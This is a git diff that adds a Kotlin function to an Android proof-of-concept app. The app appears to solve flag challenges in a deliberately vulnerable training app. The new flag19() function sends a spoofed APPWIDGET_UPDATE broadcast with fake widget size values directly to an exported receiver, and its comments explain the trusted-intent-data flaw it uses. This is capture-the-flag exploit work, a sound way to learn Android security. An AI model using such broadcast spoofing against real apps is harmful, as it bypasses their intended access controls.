@@ -3,6 +3,7 @@ package com.vishal2376.hextreepoc
 import android.app.PendingIntent
 import android.content.Context
 import android.content.Intent
+import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import androidx.core.net.toUri
@@ -320,6 +321,34 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 			putExtra("flag", "give-flag-17")
 		}
 		activity.sendOrderedBroadcast(intent, null)
+	}
+
+	/**
+	 * FLAG 19 - Hijack App Widget Update
+	 * Technique: Spoofed APPWIDGET_UPDATE broadcast with fake size values
+	 *
+	 * Flow:
+	 * 1. AppWidgetProvider is just a BroadcastReceiver - send it a broadcast directly
+	 * 2. action must contain "APPWIDGET_UPDATE" to pass the onReceive() gate
+	 * 3. appWidgetOptions Bundle normally holds real widget size (min/max height)
+	 * 4. We fake it with magic values 1094795585 / 322376503 -> success()
+	 *
+	 * Key insight: widget size Bundle is just trusted intent data, not verified
+	 * against the actual widget on screen - same magic-constant pattern as Flag12.
+	 */
+	fun flag19() {
+		val receiverPath = "$packageName.receivers.Flag19Widget"
+		val appWidgetBundle = Bundle().apply {
+			putInt("appWidgetMaxHeight", 1094795585)
+			putInt("appWidgetMinHeight", 322376503)
+		}
+
+		val intent = Intent().apply {
+			setClassName(packageName, receiverPath)
+			action = "APPWIDGET_UPDATE"
+			putExtra("appWidgetOptions", appWidgetBundle)
+		}
+		activity.sendBroadcast(intent)
 	}
 
 	/**
